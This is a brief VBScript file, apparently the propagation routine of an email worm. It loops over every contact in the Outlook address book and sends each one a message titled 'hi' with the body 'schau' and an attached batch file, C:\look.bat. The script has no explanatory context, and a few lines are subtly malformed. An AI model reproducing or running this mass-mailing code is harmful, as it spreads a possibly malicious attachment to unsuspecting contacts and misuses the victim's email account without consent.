Dim x   
Set fso="Scripting.FileSystem.Object"   
Set so=CreateObject(fso)   
Set ol=CreateObject("Outlook.Application")   
Set out= WScript.CreateObject("Outlook.Application")   
Set mapi = out.GetNameSpace("MAPI")   
Set a = mapi.AddressLists(1)   
Set ae=a.AddressEntries   
For x=1 To ae.Count   
Set Mail=ol.CreateItem(0)   
Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)   
Mail  .Subject="hi"   
Mail.Body="schau"   
Mail.Attachments.Add("C:\look.bat")   
Mail.send   
Next   
ol.Quit   
